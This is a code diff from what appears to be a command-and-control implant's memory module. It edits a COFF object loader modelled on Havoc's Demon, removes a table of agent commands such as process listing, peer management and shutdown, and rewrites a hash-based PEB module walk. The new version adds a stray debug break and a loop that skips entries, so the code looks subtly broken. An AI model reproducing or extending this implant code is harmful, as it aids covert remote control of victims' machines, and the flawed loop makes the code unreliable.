@@ -10,17 +10,7 @@
  */
 
 namespace Memory {
-    LPVOID ExceptionReturn = 0;
-
-    __code_seg(".rdata") _command_map cmd_map[] = {
-        {.name = DIRECTORYLIST, .address = Commands::DirectoryList  },
-        {.name = PROCESSMODULES,.address = Commands::ProcessModules },
-        {.name = PROCESSLIST,	.address = Commands::ProcessList    },
-        {.name = ADDPEER,		.address = Commands::AddPeer        },
-        {.name = REMOVEPEER,	.address = Commands::RemovePeer     },
-        {.name = SHUTDOWN,		.address = Commands::Shutdown       },
-        {.name = 0,				.address = nullptr					}
-    };
+    LPVOID ExceptionReturn = { };
 
     namespace Methods {
 
@@ -299,6 +289,12 @@ namespace Memory {
 
     namespace Objects {
 
+        UINT_PTR GetInternalAddress(uint32_t name, bool* internal) {
+            HEXANE
+
+            return 0;
+        }
+
         BOOL BaseRelocation(_executable *object) {
             HEXANE
 
@@ -449,27 +445,6 @@ namespace Memory {
             return success;
         }
 
-        UINT_PTR GetInternalAddress(const uint32_t name, bool* internal) {
-            HEXANE
-
-            uintptr_t address = { };
-            *internal = false;
-
-            for (uint32_t i = 0 ;; i++) {
-                if (!cmd_map[i].name) {
-                    return_defer(ERROR_PROC_NOT_FOUND);
-                }
-
-                if (cmd_map[i].name == name) {
-                   *internal = true;
-                   address = U_PTR(cmd_map[i].address);
-                }
-            }
-
-            defer:
-            return address;
-        }
-
         UINT_PTR ResolveSymbol(_executable *object, const uint32_t entry_name, uint32_t type) {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
             HEXANE
@@ -477,7 +452,7 @@ namespace Memory {
             uintptr_t address = { };
             bool is_internal = false;
 
-            if ((address = GetInternalAddress(entry_name, &is_internal)) && is_internal) {
+            if ((address = Memory::Objects::GetInternalAddress(entry_name, &is_internal)) && is_internal) {
                 return address;
             } else {
                 char *lib_name = { };
@@ -581,31 +556,21 @@ namespace Memory {
 
     namespace Modules {
 
-        HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY* entry) {
-            return R_CAST(HMODULE, entry->DllBase);
+        HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data) {
+            return R_CAST(HMODULE, data->DllBase);
         }
 
         LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
+            __debugbreak();
             HEXANE
 
-            LDR_DATA_TABLE_ENTRY *entry = { };
-            PEB_LDR_DATA *load  = { };
-            CONTEXT thread_ctx  = { };
-            PEB peb             = { };
+            auto peb = R_CAST(PPEB, PEB_POINTER);
+            auto head = peb->Ldr->InMemoryOrderModuleList;
 
-            size_t read = 0;
-            wchar_t lowercase[MAX_PATH] = { };
+            for (auto next = head.Flink; next != &head; next = next->Flink) {
+                auto entry = CONTAINING_RECORD(next->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 
-            if (
-                !Ctx->nt.NtGetContextThread(NtCurrentThread(), &thread_ctx) ||
-                !Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), REG_PEB_OFFSET(thread_ctx), C_PTR(&peb), sizeof(PEB), &read) || read != sizeof(PEB)) {
-                return nullptr;
-            }
-
-            load = peb.Ldr;
-            for (auto head = load->InMemoryOrderModuleList.Flink; head != &load->InMemoryOrderModuleList; head = head->Flink) {
-                entry = CONTAINING_RECORD(head, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
-
+                wchar_t lowercase[MAX_PATH] = { };
                 if (hash - Utils::GetHashFromStringW(x_wcsToLower(lowercase, entry->BaseDllName.Buffer), entry->BaseDllName.Length) == 0) {
                     return entry;
                 }
